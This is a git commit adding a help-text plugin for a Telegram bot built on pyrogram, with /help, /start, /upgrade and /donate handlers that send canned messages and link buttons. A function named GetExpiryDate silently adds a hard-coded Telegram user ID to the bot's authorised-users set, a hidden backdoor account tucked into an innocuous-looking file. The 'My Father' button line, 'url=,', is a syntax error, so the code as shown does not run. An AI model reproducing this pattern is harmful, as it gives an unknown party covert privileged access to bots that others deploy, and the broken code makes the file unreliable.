6a75ed570a867ba48b66947077e56db0640504a1
Ns-AnoNymouS <70622189+Ns-AnoNymouS@users.noreply.github.com>
2020-09-02 10:58:31 +0530

    Create help_text.py

---
+++ plugins/help_text.py
@@ -0,0 +1,95 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) Shrimadhav U K
+
+# the logging things
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+from helper_funcs.chat_base import TRChatBase
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(683538773)
+    return expires_at
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
+async def help_user(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/help")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.HELP_USER.format(update.from_user.first_name),
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
+async def start(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/start")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.START_TEXT.format(update.from_user.first_name), 
+        #reply_to_message_id=update.message_id
+        reply_markup=InlineKeyboardMarkup(
+        [
+          [
+          InlineKeyboardButton('My Father 👨‍💻', url=),
+          InlineKeyboardButton('Discuss 🗣', url='https://t.me/anonymousbotdiscussion')
+          ],
+          [
+          InlineKeyboardButton('Updates channel 📢', url='https://t.me/anonymousbotupdates'),
+          InlineKeyboardButton('Rate Me ⭐', url='https://t.me/anonymousbotdiscussion/215')
+          ]
+        ]
+      )
+    )
+    return 
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
+async def upgrade(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/upgrade")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.UPGRADE_TEXT,
+        parse_mode="html",
+        reply_to_message_id=update.message_id,
+        disable_web_page_preview=True
+    )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
+async def donate(bot, update):
+       await bot.send_message(
+             chat_id=update.chat.id,
+             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
+             reply_markup=InlineKeyboardMarkup(
+             [
+               [
+                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/maheshmalekar')
+               ]
+             ]
+           )
+          )
